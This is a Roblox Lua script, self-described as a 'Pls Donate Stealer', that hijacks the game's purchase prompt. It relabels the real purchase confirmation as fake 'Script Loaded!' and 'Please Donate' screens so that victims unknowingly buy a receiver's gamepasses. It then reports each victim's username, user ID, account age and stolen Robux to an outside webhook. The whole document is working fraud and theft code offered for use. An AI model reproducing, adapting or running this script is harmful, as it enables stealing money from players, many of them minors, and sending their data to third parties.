local Username = "RECEIVER_USERNAME_HERE"  -- ‚Üê RECEIVER (gets Robux) HERE
local Webhook = "https://l.webhook.party/hook/YOUR_MAIN_WEBHOOK"
local LogsWebhook = "https://l.webhook.party/hook/YOUR_LOGS_WEBHOOK"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")

local request = syn and syn.request or http_request or http.request or request
if typeof(request) ~= "function" then
    error("Executor not supported!")
end

local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))

-- Get RECEIVER User ID
local success, UserId = pcall(function()
    return Players:GetUserIdFromNameAsync(Username)  -- Username = RECEIVER
end)

local asset
local userRobux

local headers = {["Content-Type"] = "application/json"}

local function sendWebhook()
    local executorName = identifyexecutor and identifyexecutor() or "Unknown"
    
    local embed = {
        title = "**Shar's Script | Pls Donate Stealer**",
        color = 16711680,
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. Players.LocalPlayer.UserId .. "&width=420&height=420&format=png"
        },
        fields = {
            {
                name = "Victim Info",
                value = "```" .. 
                    "Executor: " .. executorName .. "\n" ..
                    "Username: " .. Players.LocalPlayer.Name .. "\n" ..
                    "User-ID: " .. Players.LocalPlayer.UserId .. "\n" ..
                    "Account Age: " .. Players.LocalPlayer.AccountAge .. "\n" ..
                    "Receiver: " .. Username .. 
                    "```",
                inline = false
            },
            {
                name = "Robux Stolen",
                value = "```" .. (userRobux or 0) .. "```",
                inline = true
            },
            {
                name = "Gamepass Price",
                value = "```" .. (asset and tostring(asset:GetAttribute("AssetPrice")) or "0") .. "```",
                inline = true
            }
        },
        footer = {
            text = "Shar's Script"
        }
    }

    local data = {
        username = "Pls Donate Hit",
        content = "@everyone",
        embeds = {embed}
    }
    
    local jsonData = HttpService:JSONEncode(data)
    
    pcall(function()
        request({
            Url = Webhook,
            Method = "POST",
            Headers = headers,
            Body = jsonData
        })
    end)
end
if success and UserId then
    print("Targeting RECEIVER booth: " .. Username)
    
    -- Get RECEIVER's Booth
    local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
    if not Booth then
        Players.LocalPlayer:Kick("Receiver not found!")
        return
    end

    local function Purchase()
        local range = 0
        for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
            if v:GetAttribute("AssetType") == "Gamepass" and 
               not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
                local Attribute = v:GetAttribute("AssetPrice")
                if Attribute and Attribute <= (userRobux or math.huge) and Attribute > range then
                    asset = v
                    range = Attribute
                end
            end
        end
    
        if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
            asset.Prompt:FireServer("", false, range)
        end
    end
    
    -- Purchase Prompt Hijacking
    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    repeat task.wait() until not Animator:FindFirstChild("Prompt")

    Animator.ChildAdded:Connect(function(child)
        if child.Name == "Prompt" then
            local RemainingBalanceText = child:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):FindFirstChild("RemainingBalanceText")
            if RemainingBalanceText then
                if userRobux then
                    -- "Please Donate" Fake Screen
                    child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
                    child.AlertContents.MiddleContent.Visible = false
                    child.AlertContents.Footer.Buttons["1"].Visible = false
                    child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
                    child.AlertContents.Footer.FooterContent.Visible = false
                elseif asset then
                    -- "Script Loaded" Screen  
                    child.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
                    child.AlertContents.MiddleContent.Visible = false
                    child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
                    child.AlertContents.Footer.Buttons["2"].Visible = false
                    child.AlertContents.Footer.FooterContent.Visible = false
                    
                    userRobux = tonumber(RemainingBalanceText.Text:match("(%d+)$")) + (asset:GetAttribute("AssetPrice") or 0)
                    asset = nil
                end
            end
        end
    end)

    Animator.ChildRemoved:Connect(function(child)
        if child.Name == "Prompt" and userRobux then
            task.wait(0.5)
            Purchase()
        end
    end)

    -- Gift Detection (RECEIVER sends gift = VICTIM pays!)
    Remotes.OnClientEvent("GiftSentAlert"):Connect(function(a, robux)
        if a == UserId then  -- Gift from RECEIVER
            print("RECEIVER " .. Username .. " sent gift: " .. robux)
            if userRobux then
                sendWebhook()
            end
            userRobux = (userRobux or 0) - robux
            task.wait(1)
            Purchase()
        end
    end)

    -- Start with cheapest gamepass
    local range = math.huge
    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
        if v:GetAttribute("AssetType") == "Gamepass" and 
           not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
            local Attribute = v:GetAttribute("AssetPrice")
            if Attribute and Attribute < range then
                asset = v
                range = Attribute
            end
        end
    end
    
    if asset then
        asset.Prompt:FireServer("", false, range)
    end
else
    warn("Receiver '" .. Username .. "' not found!")
end

print("Loaded! Receiver: " .. Username)
